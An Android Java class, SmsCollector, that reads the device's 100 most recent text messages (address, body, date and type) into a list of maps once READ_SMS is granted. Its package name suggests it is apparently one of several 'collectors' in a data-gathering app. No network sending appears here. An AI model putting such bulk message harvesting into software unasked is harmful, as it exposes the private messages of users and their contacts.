package com.ultimate.access.collectors;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;

import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SmsCollector {

    private Context context;

    public SmsCollector(Context context) {
        this.context = context;
    }

    public List<Map<String, Object>> getSmsMessages() {
        List<Map<String, Object>> smsList = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            return smsList;
        }

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                null,
                null,
                null,
                Telephony.Sms.DATE + " DESC LIMIT 100"
        );

        if (cursor != null) {
            int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
            int dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
            int typeIndex = cursor.getColumnIndex(Telephony.Sms.TYPE);

            while (cursor.moveToNext()) {
                Map<String, Object> sms = new HashMap<>();

                if (addressIndex != -1) {
                    sms.put("address", cursor.getString(addressIndex));
                }

                if (bodyIndex != -1) {
                    sms.put("body", cursor.getString(bodyIndex));
                }

                if (dateIndex != -1) {
                    sms.put("date", new Date(cursor.getLong(dateIndex)));
                }

                if (typeIndex != -1) {
                    int type = cursor.getInt(typeIndex);
                    if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) {
                        sms.put("type", "INBOX");
                    } else if (type == Telephony.Sms.MESSAGE_TYPE_SENT) {
                        sms.put("type", "SENT");
                    } else {
                        sms.put("type", "DRAFT");
                    }
                }

                smsList.add(sms);
            }
            cursor.close();
        }

        return smsList;
    }
}